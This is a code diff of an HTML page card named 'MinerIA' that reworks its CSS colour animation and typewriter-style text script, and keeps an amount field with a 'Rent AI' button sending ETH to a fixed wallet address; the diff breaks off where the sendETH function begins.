@@ -140,79 +140,71 @@
       </div>
 
       <div class="card">
-       
+  <h3>Miner<span class="animated-text">IA</span> <span style="color:dimgray">&lt;0.1.1&gt;</span></h3>
+  <style>
+      .animated-text {
+          animation: change-colors 3s infinite;
+      }
 
-<h3>Miner<span class="animated-text">IA</span> <span style="color:dimgray">&lt;0.1.1&gt;</span></h3>
+      @keyframes change-colors {
+          0% {
+              color: gray;
+          }
+          33% {
+              color: white;
+          }
+          66% {
+              color: black;
+          }
+          100% {
+              color: gray;
+          }
+      }
+  </style>
+  <p style="color: white; font-size: 12px; font-weight: bold; font-family: 'Roboto', sans-serif; text-align: center; border-bottom: 1px solid white;">
+    <span id="mine-text-2"></span>
+    <span id="mine-cursor-2">...</span>
+  </p>
+  <style>
+    /* Animación del cursor */
+    @keyframes blink-caret-2 {
+      from, to { opacity: 0 }
+      50% { opacity: 1 }
+    }
+  </style>
+  <script>
+    const mineText2 = document.getElementById('mine-text-2');
+    const mineCursor2 = document.getElementById('mine-cursor-2');
+    const miningMessage2 = '...';
 
-<style>
-    .animated-text {
-        animation: change-colors 3s infinite;
+    let i2 = 0;
+    function typeMiningMessage2() {
+      if (i2 < miningMessage2.length) {
+        mineText2.innerHTML += miningMessage2.charAt(i2);
+        i2++;
+        setTimeout(typeMiningMessage2, 150);
+      } else {
+        mineCursor2.style.animation = 'blink-caret-2 0.75s step-end infinite';
+        setInterval(function() {
+          mineCursor2.style.opacity = (mineCursor2.style.opacity === '1' ? '0' : '1');
+        }, 400);
+        setInterval(function() {
+          let dots2 = '';
+          let rand2 = Math.floor(Math.random() * 3) + 1;
+          for (let i2 = 0; i2 < rand2; i2++) {
+            dots2 += '.';
+          }
+          mineText2.innerHTML = miningMessage2 + dots2;
+        }, 7000);
+      }
     }
 
-    @keyframes change-colors {
-        0% {
-            color: gray;
-        }
-        33% {
-            color: white;
-        }
-        66% {
-            color: black;
-        }
-        100% {
-            color: gray;
-        }
-    }
-</style>
-<p style="color: white; font-size: 12px; font-weight: bold; font-family: 'Roboto', sans-serif; text-align: center; border-bottom: 1px solid white;">
-  <span id="mine-text"></span>
-  <span id="mine-cursor">...</span>
-</p>
+    setTimeout(typeMiningMessage2, 1000);
+  </script>
+  <input type="number" id="amount2">
+  <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount2').value)">Rent AI</button>
+</div>
 
-<style>
-  /* Animación del cursor */
-  @keyframes blink-caret {
-    from, to { opacity: 0 }
-    50% { opacity: 1 }
-  }
-</style>
-
-<script>
-  const mineText = document.getElementById('mine-text');
-  const mineCursor = document.getElementById('mine-cursor');
-  const miningMessage = 'Enter the amount of ETH you want to Mine';
-
-  let i = 0;
-  function typeMiningMessage() {
-    if (i < miningMessage.length) {
-      mineText.innerHTML += miningMessage.charAt(i);
-      i++;
-      setTimeout(typeMiningMessage, 150);
-    } else {
-      mineCursor.style.animation = 'blink-caret 0.75s step-end infinite';
-      setInterval(function() {
-        mineCursor.style.opacity = (mineCursor.style.opacity === '1' ? '0' : '1');
-      }, 400);
-      setInterval(function() {
-        let dots = '';
-        let rand = Math.floor(Math.random() * 3) + 1;
-        for (let i = 0; i < rand; i++) {
-          dots += '.';
-        }
-        mineText.innerHTML = miningMessage + dots;
-      }, 7000);
-    }
-  }
-
-  setTimeout(typeMiningMessage, 1000);
-</script>
-
-
-
-        <input type="number" id="amount2">
-        <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount2').value)">Rent AI</button>
-      </div>
-    </div>
 
     <script>
      async function sendETH(toAddress, amount) {
